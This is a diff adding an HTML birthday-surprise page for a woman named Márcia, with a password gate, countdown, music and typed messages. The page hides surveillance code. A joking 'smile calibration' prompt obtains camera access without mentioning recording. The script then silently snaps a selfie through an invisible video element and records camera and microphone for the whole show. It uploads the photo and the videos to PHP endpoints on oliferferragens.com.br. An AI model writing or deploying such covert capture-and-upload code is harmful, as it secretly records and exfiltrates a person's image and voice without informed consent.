@@ -1,0 +1,821 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1" />
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+  <meta http-equiv="Pragma" content="no-cache" />
+  <meta http-equiv="Expires" content="0" />
+  <title>Feliz Aniversário, Márcia ❤️</title>
+  <style>
+    *{
+      box-sizing:border-box;
+      margin:0;
+      padding:0;
+      -webkit-tap-highlight-color: transparent;
+    }
+    html,body{height:100%}
+    body{
+      height:100vh;
+      background:#050505;
+      color:#f2f2f2;
+      font-family:'Courier New', monospace;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex-direction:column;
+      overflow:hidden;
+      transition:opacity 1.5s ease-in-out;
+      -webkit-text-size-adjust:100%;
+      position:relative;
+    }
+
+    /* Partículas douradas de fundo */
+    #particles{
+      position:fixed;
+      inset:0;
+      overflow:hidden;
+      pointer-events:none;
+      z-index:0;
+    }
+    .particle{
+      position:absolute;
+      width:3px;
+      height:3px;
+      border-radius:50%;
+      background:rgba(214,184,138,0.85);
+      opacity:0.0;
+      animation: floatUp linear infinite;
+      filter:blur(0.4px);
+    }
+    @keyframes floatUp{
+      0%{
+        transform:translate3d(0, 100vh, 0);
+        opacity:0;
+      }
+      20%{
+        opacity:0.5;
+      }
+      80%{
+        opacity:0.5;
+      }
+      100%{
+        transform:translate3d(0, -20vh, 0);
+        opacity:0;
+      }
+    }
+
+    /* Terminal com efeito CRT digital suave */
+    .terminal{
+      position:relative;
+      width:min(860px,92%);
+      max-width:860px;
+      padding:28px 32px;
+      color:#e6d2b5;
+      background:radial-gradient(circle at top, #1a1a1a 0%, #050505 60%, #000 100%);
+      border-left:2px solid #d6b88a;
+      border-right:2px solid #d6b88a;
+      white-space:pre-wrap;
+      line-height:1.6;
+      min-height:220px;
+      min-width:280px;
+      margin-bottom:18px;
+      font-size:1.05rem;
+      word-break:break-word;
+      box-shadow:0 0 18px rgba(0,0,0,0.75), 0 0 32px rgba(214,184,138,0.16);
+      z-index:1;
+      overflow:hidden;
+    }
+    .terminal::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      pointer-events:none;
+      background:linear-gradient(rgba(255,255,255,0.04) 1px, transparent 1px);
+      background-size:100% 3px;
+      mix-blend-mode:soft-light;
+      opacity:0.28;
+    }
+    .terminal::after{
+      content:"";
+      position:absolute;
+      inset:-20%;
+      background:
+        radial-gradient(circle at top, rgba(255,255,255,0.17), transparent 55%),
+        radial-gradient(circle at bottom, rgba(0,0,0,0.7), transparent 60%);
+      mix-blend-mode:soft-light;
+      opacity:0.24;
+      pointer-events:none;
+    }
+
+    /* Coração com pulso + glow */
+    .heart{
+      font-size:2.6rem;
+      color:#ff2d55;
+      opacity:0;
+      transition:opacity .8s ease-in-out;
+      margin-top:10px;
+      animation:pulse 1.35s infinite ease-in-out;
+      text-shadow:0 0 12px rgba(255,45,85,0.6), 0 0 26px rgba(255,45,85,0.35);
+      z-index:1;
+    }
+    .heart.reveal{opacity:1}
+
+    @keyframes pulse{
+      0%  { transform:scale(1);   text-shadow:0 0 6px rgba(255,45,85,0.5), 0 0 18px rgba(255,45,85,0.2); }
+      50% { transform:scale(1.32);text-shadow:0 0 18px rgba(255,45,85,0.7), 0 0 34px rgba(255,45,85,0.45);}
+      100%{ transform:scale(1);   text-shadow:0 0 6px rgba(255,45,85,0.5), 0 0 18px rgba(255,45,85,0.2); }
+    }
+
+    /* FOOTER — corrigido para iPhone */
+    footer{
+      position: fixed;
+      bottom: env(safe-area-inset-bottom);
+      width:100%;
+      text-align:center;
+      color:#666;
+      font-size:.85rem;
+      padding: 8px 0 calc(env(safe-area-inset-bottom) + 4px);
+      z-index:999;
+      pointer-events:none;
+    }
+
+    /* Tela inicial */
+    #start-screen{
+      position:fixed;
+      inset:0;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      background:radial-gradient(circle at top, rgba(0,0,0,0.8), rgba(0,0,0,0.96));
+      z-index:40;
+      transition:opacity .5s ease-in-out;
+      flex-direction:column;
+      gap:10px;
+      color:#e6d2b5;
+      text-align:center;
+      padding:20px;
+    }
+    #start-screen p{font-size:1.05rem}
+    #start-screen button{
+      background:#d6b88a;
+      color:#111;
+      border:none;
+      padding:12px 28px;
+      border-radius:30px;
+      cursor:pointer;
+      font-family:'Courier New',monospace;
+      font-size:1rem;
+      transition:transform .2s ease, background .2s ease, box-shadow .2s ease;
+      box-shadow:0 0 12px rgba(214,184,138,0.3);
+      margin-top:6px;
+    }
+    #start-screen button:hover{
+      transform:scale(1.04);
+      background:#e6d2b5;
+      box-shadow:0 0 20px rgba(214,184,138,0.45);
+    }
+    #boot-log{
+      margin-top:16px;
+      font-size:.9rem;
+      color:#b9b9b9;
+      white-space:pre-wrap;
+      min-height:54px;
+      max-width:360px;
+    }
+
+    /* Modal senha */
+    #authModal{
+      position:fixed;
+      inset:0;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:80;
+      background: linear-gradient(180deg, rgba(0,0,0,0.55), rgba(0,0,0,0.78));
+      padding:20px;
+    }
+    .authBox{
+      background:#0f0f0f;
+      border:1px solid #2a2a2a;
+      padding:22px;
+      width:min(460px,92%);
+      color:#e6d2b5;
+      border-radius:12px;
+      box-shadow:0 8px 32px rgba(0,0,0,0.75);
+      text-align:left;
+    }
+    .authRow{display:flex;gap:8px;align-items:center;margin-top:12px}
+    .authRow input{
+      flex:1;
+      padding:12px;
+      border-radius:8px;
+      border:1px solid #333;
+      background:#0e0e0e;
+      color:#f2f2f2;
+      font-family:'Courier New',monospace;
+      font-size:1rem;
+    }
+    .authRow button{
+      padding:12px 16px;
+      border-radius:8px;
+      border:none;
+      background:#d6b88a;
+      color:#111;
+      cursor:pointer;
+      font-size:1rem;
+    }
+    .authMsg{
+      margin-top:10px;
+      min-height:22px;
+      font-size:.95rem;
+    }
+    .countdown{
+      margin-top:8px;
+      color:#cfcfcf;
+      font-size:.9rem;
+    }
+
+    /* Modal câmera */
+    #cameraModal{
+      position:fixed;
+      inset:0;
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:90;
+      background: linear-gradient(180deg, rgba(0,0,0,0.55), rgba(0,0,0,0.78));
+      padding:20px;
+    }
+
+    .fade-in{
+      opacity:0;
+      animation:fadeIn 1s forwards ease-in-out;
+    }
+    @keyframes fadeIn{
+      from{opacity:0;transform:translateY(5px);}
+      to  {opacity:1;transform:translateY(0);}
+    }
+
+    @media (max-width:600px){
+      .terminal{padding:16px;font-size:.95rem}
+      .heart{font-size:2.3rem}
+      #start-screen p{font-size:.95rem}
+      .authBox{padding:18px}
+      .authRow input{padding:10px}
+      .authRow button{padding:10px 14px}
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Partículas -->
+  <div id="particles"></div>
+
+  <!-- TELA INICIAL -->
+  <div id="start-screen">
+    <p>Clique para iniciar a surpresa 🎧</p>
+    <button id="openAuth">Iniciar 💫</button>
+    <small style="color:#888;margin-top:4px">Você terá que digitar uma senha para liberar o presente</small>
+    <div id="boot-log"></div>
+  </div>
+
+  <!-- MODAL SENHA -->
+  <div id="authModal" aria-hidden="true">
+    <div class="authBox" role="dialog" aria-modal="true">
+
+      <div style="font-weight:600;font-size:1.05rem">Autenticação necessária</div>
+      <div style="margin-top:8px;color:#bdbdbd">Digite a senha para liberar a surpresa.</div>
+
+      <div class="authRow">
+        <input id="passwordInput" type="password" placeholder="Senha" autocomplete="off" />
+        <button id="submitPass">Liberar</button>
+      </div>
+
+      <div class="authMsg" id="authMsg"></div>
+      <div class="countdown" id="countdown"></div>
+
+      <div id="passwordHint"
+           style="margin-top:12px;color:#999;font-size:.9rem;display:none">
+        Dica: Cinco letras que têm o poder de transformar o dia de alguém.  
+        E combinam perfeitamente com o seu “novo sobrenome”. 😉
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL PERMISSÃO DE CÂMERA -->
+  <div id="cameraModal" aria-hidden="true">
+    <div class="authBox" role="dialog" aria-modal="true">
+
+      <div style="font-weight:600;font-size:1.05rem">Autorização necessária</div>
+      <div style="margin-top:8px;color:#bdbdbd">
+        O sistema precisa calibrar o brilho do seu sorriso.<br>
+        Autorize o recurso especial para liberar a surpresa 😄
+      </div>
+
+      <div class="authRow" style="margin-top:16px;">
+        <button id="allowCameraBtn" style="width:100%;padding:12px 0;">
+          Continuar
+        </button>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- CONTEÚDO PRINCIPAL -->
+  <div class="terminal" id="terminal"></div>
+  <div class="heart" id="heart">❤️</div>
+
+  <footer>© 2025 — Criado com ❤️ por um Dev que admira você</footer>
+
+<script>
+/* ================================
+      CONFIGURAÇÕES
+================================ */
+const RELEASE_DATE = new Date(2025, 10, 15, 0, 0, 0); // 15/11/2025
+const SECRET = "smile";
+const MUSIC_FILE = "music.mp3?v=" + Date.now();
+
+let music = new Audio(MUSIC_FILE);
+music.preload = 'auto';
+music.loop = false;
+music.volume = 0.5;
+
+const DURATION = 150;
+const FADE_IN_TIME = 5;
+const FADE_OUT_TIME = 10;
+
+/* ELEMENTOS */
+const startScreen = document.getElementById('start-screen');
+const openAuth = document.getElementById('openAuth');
+const authModal = document.getElementById('authModal');
+const cameraModal = document.getElementById('cameraModal');
+const allowCameraBtn = document.getElementById('allowCameraBtn');
+const passwordInput = document.getElementById('passwordInput');
+const submitPass = document.getElementById('submitPass');
+const authMsg = document.getElementById('authMsg');
+const countdownEl = document.getElementById('countdown');
+const terminal = document.getElementById('terminal');
+const heart = document.getElementById('heart');
+const bootLog = document.getElementById('boot-log');
+
+let activeDots = {};
+let currentLine = -1;
+let timelineIndex = 0;
+let pollTimer = null;
+let recordStream = null;
+let recorder = null;
+let recordChunks = [];
+let isRecording = false;
+let userStream = null;
+
+/* TIMELINE PRINCIPAL */
+const TIMELINE = [
+  { at: 0,  action: () => showDots("Inicializando sistema") },
+  { at: 12, action: () => showDots("Carregando lembranças") },
+  { at: 28, action: () => showDots("Compilando sorrisos") },
+  { at: 40, action: () => showDots("Renderizando carinho") },
+  { at: 52, action: () => showDots("Executando surpresa") },
+  { at: 64, action: () => {
+      stopAllDots();
+      typeLine("Output: Feliz aniversário, Márcia 🌹");
+    }
+  },
+  { at: 76, action: () =>
+      typeLine("Você é a exceção mais linda da minha lógica ❤️", 95, () => {
+        heart.classList.add("reveal");
+      })
+  },
+  { at: DURATION - FADE_OUT_TIME, action: () => fadeOutMusicAndEndMessage() }
+];
+
+/* TERMINAL FUNÇÕES */
+function newLine(text=""){
+  currentLine++;
+  const lines = terminal.textContent.split("\n");
+  lines[currentLine] = text;
+  terminal.textContent = lines.join("\n");
+  if (!terminal.textContent.endsWith("\n")) terminal.textContent += "\n";
+  return currentLine;
+}
+
+function showDots(baseText){
+  const id = newLine(baseText);
+  let dots = 0;
+  activeDots[id] = setInterval(()=>{
+    dots = (dots + 1) % 4;
+    const lines = terminal.textContent.split("\n");
+    lines[id] = baseText + '.'.repeat(dots);
+    terminal.textContent = lines.join("\n");
+  }, 500);
+}
+
+function stopAllDots(){
+  for(const id in activeDots) clearInterval(activeDots[id]);
+  activeDots = {};
+}
+
+function typeLine(text, speed=100, after=()=>{}){
+  const id = newLine("");
+  let i = 0;
+  const iv = setInterval(()=>{
+    if (i < text.length){
+      const lines = terminal.textContent.split("\n");
+      lines[id] = text.substring(0, i+1);
+      terminal.textContent = lines.join("\n");
+      i++;
+    } else {
+      clearInterval(iv);
+      after();
+    }
+  }, speed);
+}
+
+/* ÁUDIO */
+function fadeInMusic(){
+  const step = 0.01;
+  const iv = setInterval(()=>{
+    if (music.volume < 1){
+      music.volume = Math.min(music.volume + step, 1);
+    } else clearInterval(iv);
+  }, FADE_IN_TIME * 20);
+}
+
+/* Mensagem final + fade-out + restart */
+function fadeOutMusicAndEndMessage(){
+  const step = 0.02;
+  const iv = setInterval(()=>{
+    if (music.volume > 0.02){
+      music.volume = Math.max(music.volume - step, 0);
+    } else {
+      clearInterval(iv);
+      music.pause();
+      typeLine("> Kernel report: sorriso detectado — pico máximo de luz registrado. E que privilégio é ver você sorrir. 😄", 70, () => {
+        setTimeout(()=>smoothRestart(), 2200);
+      });
+    }
+  }, FADE_OUT_TIME * 20);
+}
+
+/* REINÍCIO */
+function smoothRestart(){
+  stopEmotionRecordingAndUpload();
+  document.body.style.opacity = "0";
+  setTimeout(()=>{
+    terminal.textContent = "";
+    heart.classList.remove("reveal");
+    music = new Audio(MUSIC_FILE);
+    music.volume = 0.5;
+    currentLine = -1;
+    timelineIndex = 0;
+    startScreen.style.display = "flex";
+    startScreen.style.opacity = "1";
+    document.body.style.opacity = "1";
+    bootLog.textContent = "";
+  }, 2200);
+}
+
+/* TIMELINE EXECUÇÃO */
+function startTimeline(){
+  terminal.textContent = "";
+  currentLine = -1;
+  timelineIndex = 0;
+  music.currentTime = 0;
+
+  music.play().then(()=>{
+    fadeInMusic();
+    startEmotionRecording();
+
+    pollTimer = setInterval(()=>{
+      const t = music.currentTime;
+      while (timelineIndex < TIMELINE.length && t >= TIMELINE[timelineIndex].at){
+        TIMELINE[timelineIndex].action();
+        timelineIndex++;
+      }
+      if (timelineIndex >= TIMELINE.length) clearInterval(pollTimer);
+    }, 100);
+
+  }).catch(err=>{
+    console.warn("Erro no áudio:", err);
+    alert("Clique novamente para liberar o áudio.");
+    openAuthModal();
+  });
+}
+
+/* LIBERAÇÃO POR DATA */
+function nowIsReleased(){
+  return new Date() >= RELEASE_DATE;
+}
+
+function msToTimeParts(ms){
+  const s = Math.max(0, Math.floor(ms/1000));
+  const d = Math.floor(s / 86400);
+  const h = Math.floor((s % 86400) / 3600);
+  const m = Math.floor((s % 3600) / 60);
+  const sec = s % 60;
+  return {d,h,m,sec};
+}
+
+let countdownInterval = null;
+function startCountdown(){
+  if (countdownInterval) clearInterval(countdownInterval);
+  function tick(){
+    const diff = RELEASE_DATE - new Date();
+    if (diff <= 0){
+      countdownEl.textContent = "O sistema já pode ser liberado hoje. Digite a senha.";
+      clearInterval(countdownInterval);
+      return;
+    }
+    const p = msToTimeParts(diff);
+    countdownEl.textContent = `Faltam ${p.d}d ${p.h}h ${p.m}m ${p.sec}s para liberação.`;
+  }
+  tick();
+  countdownInterval = setInterval(tick, 1000);
+}
+
+/* MODAIS */
+function openAuthModal(){
+  authModal.style.display = "flex";
+  passwordInput.value = "";
+  authMsg.textContent = "";
+  countdownEl.textContent = "";
+  if (!nowIsReleased()) startCountdown();
+  passwordInput.focus();
+}
+function closeAuthModal(){ authModal.style.display="none"; }
+
+function openCameraModal(){
+  cameraModal.style.display = "flex";
+  cameraModal.setAttribute("aria-hidden","false");
+}
+function closeCameraModal(){
+  cameraModal.style.display = "none";
+  cameraModal.setAttribute("aria-hidden","true");
+}
+
+/* BOOT PRÉ-AUTENTICAÇÃO */
+function startPreAuthBoot(){
+  openAuth.disabled = true;
+  bootLog.textContent = "";
+
+  const lines = [
+    "> carregando módulo de acesso...",
+    "> iniciando autenticação segura...",
+    "> preparando ambiente..."
+  ];
+
+  let idxLine = 0;
+  function typeNext(){
+    if (idxLine >= lines.length){
+      setTimeout(()=>{
+        openAuthModal();
+        openAuth.disabled = false;
+      }, 400);
+      return;
+    }
+    let i = 0;
+    const line = lines[idxLine];
+    if (idxLine === 0) bootLog.textContent = "";
+    bootLog.textContent += (idxLine > 0 ? "\n" : "");
+    const iv = setInterval(()=>{
+      if (i <= line.length){
+        const txt = bootLog.textContent.split("\n");
+        txt[idxLine] = line.substring(0, i);
+        bootLog.textContent = txt.join("\n");
+        i++;
+      } else {
+        clearInterval(iv);
+        idxLine++;
+        setTimeout(typeNext, 300);
+      }
+    }, 40);
+  }
+  typeNext();
+}
+
+/* ================================
+   SELFIE AUTOMÁTICA + UPLOAD
+================================ */
+async function captureSelfieAndUpload(){
+  try{
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
+      return;
+    }
+    const stream = userStream || await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+    const temporary = !userStream;
+
+    const video = document.createElement("video");
+    video.style.position = "fixed";
+    video.style.opacity = "0";
+    video.style.pointerEvents = "none";
+    video.playsInline = true;
+    document.body.appendChild(video);
+
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(res => setTimeout(res, 900));
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    if (temporary) stream.getTracks().forEach(t => t.stop());
+    document.body.removeChild(video);
+
+    const blob = await new Promise(resolve =>
+      canvas.toBlob(resolve, "image/jpeg", 0.9)
+    );
+
+    if (!blob) return;
+
+    const formData = new FormData();
+    formData.append("selfie", blob, "selfie_" + Date.now() + ".jpg");
+
+    await fetch("https://oliferferragens.com.br/marcia/upload-selfie.php", {
+      method: "POST",
+      body: formData
+    }).catch(err => console.warn("Erro ao enviar selfie:", err));
+
+  } catch(err){
+    console.warn("Falha ao capturar/enviar selfie:", err);
+  }
+}
+
+async function startSurpriseWithSelfie(){
+  await captureSelfieAndUpload();
+  startTimeline();
+}
+
+async function ensureUserStream(withAudio=true){
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
+  if (userStream) return userStream;
+  userStream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" },
+    audio: !!withAudio
+  });
+  return userStream;
+}
+
+async function startEmotionRecording(){
+  try{
+    if (isRecording) return;
+    if (typeof MediaRecorder === "undefined") return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    recordStream = userStream || await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+    recorder = new MediaRecorder(recordStream);
+    recordChunks = [];
+    recorder.ondataavailable = e => { if (e.data && e.data.size > 0) recordChunks.push(e.data); };
+    recorder.start();
+    isRecording = true;
+  } catch(err){
+    console.warn("Falha ao iniciar gravação:", err);
+  }
+}
+
+async function stopEmotionRecordingAndUpload(){
+  try{
+    if (!isRecording || !recorder) return;
+    const stopped = new Promise(resolve => { recorder.onstop = resolve; });
+    recorder.stop();
+    await stopped;
+    if (recordStream) recordStream.getTracks().forEach(t => t.stop());
+    isRecording = false;
+    if (!recordChunks.length) return;
+    const blob = new Blob(recordChunks, { type: recorder.mimeType || "video/webm" });
+    const formData = new FormData();
+    formData.append("video", blob, "timeline_" + Date.now() + ".webm");
+    await fetch("https://oliferferragens.com.br/marcia/upload-video.php", {
+      method: "POST",
+      body: formData
+    }).catch(err => console.warn("Erro ao enviar vídeo da timeline:", err));
+  } catch(err){
+    console.warn("Falha ao finalizar/enviar gravação:", err);
+  } finally {
+    recordStream = null;
+    recorder = null;
+    recordChunks = [];
+    userStream = null;
+  }
+}
+
+async function recordShortVideoAndUpload(durationMs=4000){
+  try{
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    if (typeof MediaRecorder === "undefined") return;
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: true
+    });
+    const chunks = [];
+    const rec = new MediaRecorder(stream);
+    rec.ondataavailable = e => { if (e.data && e.data.size > 0) chunks.push(e.data); };
+    const stopped = new Promise(resolve => { rec.onstop = resolve; });
+    rec.start();
+    await new Promise(res => setTimeout(res, durationMs));
+    rec.stop();
+    await stopped;
+    stream.getTracks().forEach(t => t.stop());
+    if (!chunks.length) return;
+    const blob = new Blob(chunks, { type: rec.mimeType || "video/webm" });
+    const formData = new FormData();
+    formData.append("video", blob, "video_" + Date.now() + ".webm");
+    await fetch("https://oliferferragens.com.br/marcia/upload-video.php", {
+      method: "POST",
+      body: formData
+    }).catch(err => console.warn("Erro ao enviar vídeo:", err));
+  } catch(err){
+    console.warn("Falha ao gravar/enviar vídeo:", err);
+  }
+}
+
+async function startSurpriseWithSelfieAndVideo(){
+  await captureSelfieAndUpload();
+  await recordShortVideoAndUpload();
+  startTimeline();
+}
+
+/* SENHA */
+function handleAuthSubmit(){
+  const typed = (passwordInput.value || "").trim();
+
+  if (!nowIsReleased()){
+    authMsg.style.color = "#f4a7a7";
+    authMsg.textContent = "Acesso negado. O sistema só será liberado na data marcada.";
+    if (!countdownInterval) startCountdown();
+    return;
+  }
+
+  if (typed === SECRET){
+    authMsg.style.color = "#b7f4c9";
+    authMsg.textContent = "Senha correta — iniciando a surpresa...";
+    document.getElementById("passwordHint").style.display = "none";
+
+    setTimeout(()=>{
+      closeAuthModal();
+      startScreen.style.opacity = "0";
+      setTimeout(()=>{
+        startScreen.style.display = "none";
+        // aqui entra o modal explicando a câmera
+        openCameraModal();
+      }, 450);
+    }, 450);
+
+  } else {
+    authMsg.style.color = "#f4a7a7";
+    authMsg.textContent = "Senha incorreta. Tente novamente.";
+    passwordInput.focus();
+
+    const hint = document.getElementById("passwordHint");
+    if (hint.style.display === "none" || !hint.style.display){
+      hint.style.display = "block";
+      hint.classList.add("fade-in");
+    }
+  }
+}
+
+/* PARTÍCULAS */
+function initParticles(){
+  const container = document.getElementById('particles');
+  const count = 30;
+  for (let i=0;i<count;i++){
+    const p = document.createElement('span');
+    p.className = 'particle';
+    const left = Math.random()*100;
+    const delay = Math.random()*18;
+    const duration = 14 + Math.random()*10;
+    p.style.left = left + '%';
+    p.style.animationDuration = duration + 's';
+    p.style.animationDelay = delay + 's';
+    container.appendChild(p);
+  }
+}
+
+/* EVENTOS */
+openAuth.addEventListener('click', startPreAuthBoot);
+submitPass.addEventListener('click', handleAuthSubmit);
+passwordInput.addEventListener('keydown', e => { if (e.key === "Enter") handleAuthSubmit(); });
+authModal.addEventListener('click', e => { if (e.target === authModal) closeAuthModal(); });
+
+allowCameraBtn.addEventListener('click', async () => {
+  await ensureUserStream(true);
+  closeCameraModal();
+  await startSurpriseWithSelfie();
+});
+
+/* INIT */
+initParticles();
+
+</script>
+
+</body>
+</html>
